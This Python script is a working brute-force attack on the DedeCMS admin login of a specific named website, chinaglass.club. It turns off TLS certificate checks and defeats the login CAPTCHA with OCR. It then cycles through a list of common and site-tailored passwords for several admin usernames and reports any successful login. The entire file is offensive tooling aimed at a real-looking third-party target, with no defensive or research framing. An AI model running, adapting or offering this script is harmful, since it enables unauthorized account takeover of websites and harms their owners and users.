#!/usr/bin/env python3
"""bf_dede_cg3.py - chinaglass.club DedeCMS爆破 v3 (验证通过)
判定: '楠岃瘉鐮佷笉姝'=验证码错(重取); '密码'=密码错(换密码); 其他=可能成功
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"}
BASE = "http://chinaglass.club"

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "root", "root123", "test", "test123", "admin!@#",
             "dedecms", "dede123", "chinaglass", "glass123", "admin2019",
             "chinaglass123", "cg123456", "gladmin"]

def preprocess(img_bytes):
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
    img = img.point(lambda p: 255 if p > 130 else 0)
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return buf.getvalue()

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocr_beta = ddddocr.DdddOcr(show_ad=False, beta=True)
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                         urllib.request.HTTPSHandler(context=ctx))
    try:
        opener.open(urllib.request.Request(BASE + "/admin/login.php", headers=UA), timeout=10).read()
    except Exception:
        pass

    tested = 0
    for user in ["admin", "root", "test", "administrator"]:
        for pw in PASSWORDS:
            # 取验证码直到识别正确(最多8次)
            code = None
            for attempt in range(8):
                try:
                    r = opener.open(urllib.request.Request(BASE + "/include/vdimgck.php", headers=UA), timeout=10)
                    img = r.read()
                    c1 = ocr.classification(img)
                    c2 = ocr_beta.classification(preprocess(img))
                    code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
                except Exception:
                    continue
                data = urllib.parse.urlencode({
                    "gotopage": "/admin/", "dopost": "login", "adminstyle": "newdedecms",
                    "userid": user, "pwd": pw, "validate": code
                }).encode()
                try:
                    req = urllib.request.Request(BASE + "/admin/login.php", data=data,
                                                 headers={**UA, "Content-Type": "application/x-www-form-urlencoded",
                                                          "Referer": BASE + "/admin/login.php"})
                    resp = opener.open(req, timeout=10)
                    b = resp.read(8000).decode("gbk", "ignore")
                    fu = resp.geturl()
                    st = resp.status
                except urllib.error.HTTPError as e:
                    st, b, fu = e.code, e.read(8000).decode("gbk", "ignore"), e.geturl()
                except Exception:
                    continue
                tested += 1
                if "楠岃瘉鐮佷笉姝" in b:
                    continue  # 验证码错, 重取
                if ("密码" in b or "瀵嗙爜" in b or "浣犵殑瀵嗙爜閿欒" in b or "閿欒" in b
                        or "错误" in b or "不存在" in b):
                    break  # 密码错, 换密码
                # 其他响应 = 可能成功!
                if st == 302 and "login" not in fu.lower():
                    print("!!! HIT: %s/%s -> %s" % (user, pw, fu), flush=True)
                    sys.exit(0)
                if "楠岃瘉鐮佷笉姝" not in b and "密码" not in b and len(b) > 500:
                    print("!!! HIT? %s/%s st=%d fu=%s" % (user, pw, st, fu), flush=True)
                    print("  body: %s" % b[:300].replace(chr(10), " "), flush=True)
                    sys.exit(0)
                break
            if tested % 20 == 0:
                print("tested %d (user=%s pw=%s)" % (tested, user, pw), flush=True)
        print("user %s done" % user, flush=True)
    print("=== NO HIT (tested=%d) ===" % tested)

if __name__ == "__main__":
    main()
